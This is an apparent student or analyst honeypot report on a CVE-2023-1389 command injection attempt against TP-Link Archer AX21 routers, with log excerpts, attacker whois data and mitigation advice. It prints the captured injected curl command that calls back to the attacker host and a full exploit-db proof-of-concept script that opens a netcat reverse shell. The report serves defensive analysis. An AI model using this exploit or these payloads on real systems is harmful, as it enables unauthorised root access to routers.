# Command Injection by IP 2.237.57.70

## Time and Date of Activity
* First activity logged: **2023-11-09T03:48:19.834213**
* Last activity logged: **2023-11-09T03:48:24.825757**

## Relevant Logs, File or Email 
* IP 2.237.57.70 conncected to the honeypot over **5** sessions making **3** HTTP requests per session.
* The destination port each time was 8080. 
* The source port was a different ephemeral port each time: 59202, 52980, 64540, 50066, 53382.


#### The 5 sessions can be seen in dshield.log and conn.log

**dshield.log** shows the following:
```
1699501699 BigDshield kernel:[50987.745307]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=55359 DF PROTO=TCP SPT=53382 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
1699501701 BigDshield kernel:[50989.149093]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=353 DF PROTO=TCP SPT=59202 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
1699501702 BigDshield kernel:[50990.343019]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=64244 DF PROTO=TCP SPT=52980 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
1699501703 BigDshield kernel:[50991.539811]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=30835 DF PROTO=TCP SPT=64540 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
1699501704 BigDshield kernel:[50992.733400]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=56344 DF PROTO=TCP SPT=50066 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
```
**Zeek conn.log** shows the following:
```
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]
1699501701.032478	Ck4N0V3ktsYTefptLi	2.237.57.70	59202	172.31.5.68	8080	tcp	http	0.202757	183	0	SF	F	T	0	ShADaFf	5	451	3	164	-
1699501702.226405	CJ3xmE3n2ttFoQNSq9	2.237.57.70	52980	172.31.5.68	8080	tcp	http	0.207294	183	0	SF	F	T	0	ShADFaf	5	451	3	164	-
1699501703.423175	C8Xolv1zqXbE5maT0j	2.237.57.70	64540	172.31.5.68	8080	tcp	http	0.206360	183	0	SF	F	T	0	ShADaFf	5	451	3	164	-
1699501704.616789	Cc3jU41mtCUXwzv309	2.237.57.70	50066	172.31.5.68	8080	tcp	http	0.209430	183	0	SF	F	T	0	ShADFaf	5	451	3	164	-
1699501699.628691	CvwvoH3MJsemJWUoab	2.237.57.70	53382	172.31.5.68	8080	tcp	http	0.598062	37	9384	SF	F	T	0	ShADadFfRR	10	505	7	9756	-
```

The 5 sets of 3 HTTP requests can be seen in webhoneypot-2023-11-09.log and Zeek http.log

Here is a sample of the 3 requests from **webhoneypot-2023-11-09.log**:
```
{"time":"2023-11-09T03:48:22.430959","headers":{"host":"54.67.87.80"},"sip":"2.237.57.70","dip":"54.67.87.80","method":"GET","url":"/","data":null,"useragent":"","version":"HTTP/1.1","response_id":{"comment":null,"headers":{"Server":"Apache/3.2.3","Access-Control-Allow-Origin":"*","content-type":"text/plain"},"status_code":200},"signature_id":{"max_score":72,"rules":[{"attribute":"method","condition":"equals","value":"GET","score":2,"required":false},{"attribute":"headers","condition":"absent","value":"user-agents","score":70,"required":false}]}}

{"time":"2023-11-09T03:48:22.432131","headers":{"host":"54.67.87.80"},"sip":"2.237.57.70","dip":"54.67.87.80","method":"GET","url":"/cgi-bin/luci/;stok=/locale","data":null,"useragent":"","version":"HTTP/1.1","response_id":{"comment":null,"headers":{"Server":"Apache/3.2.3","Access-Control-Allow-Origin":"*","content-type":"text/plain"},"status_code":200},"signature_id":{"max_score":72,"rules":[{"attribute":"method","condition":"equals","value":"GET","score":2,"required":false},{"attribute":"headers","condition":"absent","value":"user-agents","score":70,"required":false}]}}

{"time":"2023-11-09T03:48:22.433258","headers":{"host":"54.67.87.80"},"sip":"2.237.57.70","dip":"54.67.87.80","method":"GET","url":"/cgi-bin/luci/;stok=/locale","data":null,"useragent":"","version":"HTTP/1.1","response_id":{"comment":null,"headers":{"Server":"Apache/3.2.3","Access-Control-Allow-Origin":"*","content-type":"text/plain"},"status_code":200},"signature_id":{"max_score":72,"rules":[{"attribute":"method","condition":"equals","value":"GET","score":2,"required":false},{"attribute":"headers","condition":"absent","value":"user-agents","score":70,"required":false}]}}
```

### Notice how the command injection is not visible in the webhoneypot logs.  It is only visible in the Zeek http.log which shows the full URI.
Zeek http.log shows the following:
```
command: 
cat tests/logs/zeek/http.log | zeek-cut id.orig_h id.orig_p id.resp_h id.resp_p method host uri | grep "2.237.57.70"

id.orig_h id.orig_p id.resp_h id.resp_p method host uri
2.237.57.70     53382   172.31.5.68     8080    GET     54.67.87.80     /
2.237.57.70     59202   172.31.5.68     8080    GET     54.67.87.80     /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);)
2.237.57.70     52980   172.31.5.68     8080    GET     54.67.87.80     /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);)
2.237.57.70     64540   172.31.5.68     8080    GET     54.67.87.80     /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);)
2.237.57.70     50066   172.31.5.68     8080    GET     54.67.87.80     /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);)
```

#### Here we can clearly see the command injection in the URI.  The command is the following:
```
curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);
```

## Your custom script for parsing the logs.
* [logreader.py](https://github.com/LucasFaudman/BACS-4498/blob/main/analyzer-scripts/logreader.py) (Base class for reading all logs as json objects with standardized keys)
* [webloganalyzer.py](https://github.com/LucasFaudman/BACS-4498/blob/main/analyzer-scripts/webloganalyzer.py) (Python script for analyzing webhoneypot logs)
* [getlogsbyip.sh](https://github.com/LucasFaudman/BACS-4498/blob/main/analyzer-scripts/getlogsbyip.sh) (Bash script for extracting logs by IP address)

## Malware Analysis
The full URI used in the command injection is the following:
```
 /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);)
 ```
The portion of the command ``uname -m`` is used to determine the architecture of the system.  In this case, the architecture is x86_64.  
```
$(uname -m) => x86_64
```

Therefore the command attempted to be executed is the following:
```
curl http://2.237.57.70:81/who=54.67.87.80Ix86_64
```
#### Which if successful would have made an HTTP GET request to a webserver running on port 81 of the attacking system 2.234.57.70 sending the following information to the attacker:
* The IP address of the honeypot: 54.67.87.80
* The architecture of the honeypot: x86_64
* The fact that the command injection was successful

## Which vulnerability does the attack attempt to exploit?
#### Exploit: [TP-Link Archer AX21 - Unauthenticated Command Injection](https://www.exploit-db.com/exploits/51677)
#### CVE: [CVE-2023-1389](https://www.tenable.com/cve/CVE-2023-1389)
#### Mitre ATT&CK: [TA0002 - Execution](https://attack.mitre.org/tactics/TA0002/)

Proof of concept exploit script from [exploit-db](https://www.exploit-db.com/exploits/51677):
```
#!/usr/bin/python3
# 
# Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection
# Date: 07/25/2023
# Exploit Author: Voyag3r (https://github.com/Voyag3r-Security)
# Vendor Homepage: https://www.tp-link.com/us/
# Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 (https://www.tenable.com/cve/CVE-2023-1389)
# Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0
# CVE: CVE-2023-1389
#
# Disclaimer: This script is intended to be used for educational purposes only.
# Do not run this against any system that you do not have permission to test. 
# The author will not be held responsible for any use or damage caused by this 
# program. 
# 
# CVE-2023-1389 is an unauthenticated command injection vulnerability in the web
# management interface of the TP-Link Archer AX21 (AX1800), specifically, in the
# *country* parameter of the *write* callback for the *country* form at the 
# "/cgi-bin/luci/;stok=/locale" endpoint. By modifying the country parameter it is 
# possible to run commands as root. Execution requires sending the request twice;
# the first request sets the command in the *country* value, and the second request 
# (which can be identical or not) executes it. 
# 
# This script is a short proof of concept to obtain a reverse shell. To read more 
# about the development of this script, you can read the blog post here:
# https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94
# Before running the script, start a nc listener on your preferred port -> run the script -> profit

import requests, urllib.parse, argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress warning for connecting to a router with a self-signed certificate
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Take user input for the router IP, and attacker IP and port
parser = argparse.ArgumentParser()

parser.add_argument("-r", "--router", dest = "router", default = "192.168.0.1", help="Router name")
parser.add_argument("-a", "--attacker", dest = "attacker", default = "127.0.0.1", help="Attacker IP")
parser.add_argument("-p", "--port",dest = "port", default = "9999", help="Local port")

args = parser.parse_args()

# Generate the reverse shell command with the attacker IP and port
revshell = urllib.parse.quote("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + args.attacker + " " + args.port + " >/tmp/f")

# URL to obtain the reverse shell
url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + revshell + ")"

# Send the URL twice to run the command. Sending twice is necessary for the attack
r = requests.get(url_command, verify=False)
r = requests.get(url_command, verify=False)
```

## What is the goal of the attack?
#### If successful this attack would have made an HTTP GET request to a webserver running on port 81 of the attacking system 2.234.57.70 sending the following information to the attacker:
* The IP address of the honeypot: 54.67.87.80
* The architecture of the honeypot: x86_64
* The fact that the command injection was successful

## If the system is vulnerable, do you think the attack will be successful?
Yes this attack was executed correctly and would have been successful if the system was a TP-Link Archer AX21 (AX1800) router running firmware versions before 1.1.4 Build 20230219 

## How can a system be protected from this attack?
If a system is a TP-Link Archer AX21 (AX1800) router running firmware versions before 1.1.4 Build 20230219 it should be updated to the latest firmware version to patch the vulnerability.

## What do you know about the attacker?
* IP Address: **2.237.57.70**
* Country: **Italy**
* City: **Palermo, Sicilia**
* ISP: **Fastweb SpA**

### Whois Information
```
# whois.ripe.net

inetnum:        2.237.56.0 - 2.237.63.255
netname:        FASTWEB-L3-PAT_NAT
descr:          PAT/NAT IP addresses POP 3601 for
descr:          Static allocation to Residential/SoHo customer with L3 devices
country:        IT
admin-c:        IRS2-RIPE
tech-c:         IRS2-RIPE
status:         ASSIGNED PA
mnt-by:         FASTWEB-MNT
remarks:        In case of improper use originating from our network,
remarks:        please mail customer or abuse@fastweb.it
remarks:        INFRA-AW
created:        2012-08-10T23:10:10Z
last-modified:  2012-08-10T23:10:10Z
source:         RIPE

person:         ip registration service
address:        Via Caracciolo, 51
address:        20155 Milano MI
address:        Italy
phone:          +39 02 45451
fax-no:         +39 02 45451
nic-hdl:        IRS2-RIPE
mnt-by:         FASTWEB-MNT
remarks:
remarks:        In case of improper use originating from our network,
remarks:        please mail customer or abuse@fastweb.it
remarks:
created:        2001-12-18T12:06:41Z
last-modified:  2008-02-29T14:09:58Z
source:         RIPE # Filtered
```
### AbuseIPDB: [https://www.abuseipdb.com/check/2.237.57.70](https://www.abuseipdb.com/check/2.237.57.70) 
* Reported 36 times. 
* Abuse confidence score of 25%

### CyberGordon [https://cybergordon.com/result.html?id=e66c7d36-d1ee-481c-875d-ebd94aa6cbce](https://cybergordon.com/result.html?id=e66c7d36-d1ee-481c-875d-ebd94aa6cbce)
|Engine|Result|
|---|---|
[E33] GreyNoise | Last report on 08 November 2023 as malicious and scanning the Internet in the last 3 months.
[E17] Pulsedive	| Risk: low. Last seen on 13 Jan 2019. Found in feed list(s): Blocklist.de Blocklist. 
[E34] IPdata.co	| Geo: Messina, Regione Siciliana, Italy. Network: AS12874, Fastweb Spa, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): DataPlane.org.
[E2] AbuseIPDB | Hostname(s): 2-237-57-70.ip237.fastwebnet.it. ISP: Fastweb SpA. Usage: None. Risk 25%. 12 report(s) by 9 user(s), last on 08 November 2023

### VirusTotal [https://www.virustotal.com/gui/ip-address/2.237.57.70/details](https://www.virustotal.com/gui/ip-address/2.237.57.70/details)
* 2 security vendors flagged this IP address as malicious

* Shodan

### ISC [https://isc.sans.edu/ipinfo/2.237.57.70](https://isc.sans.edu/ipinfo/2.237.57.70)
* Network:	2.232.0.0/13 (2.232.0.0-2.239.255.255) 2.240.0.0
* Reports:	1
* Targets:	1
* First Reported:	2023-11-07
* Most Recent Report:	2023-11-08

## Indicator of Compromise
IP List: **2.237.57.70**


### Analyst Name: Lucas Faudman
### Date of Analysis: November 9, 2023
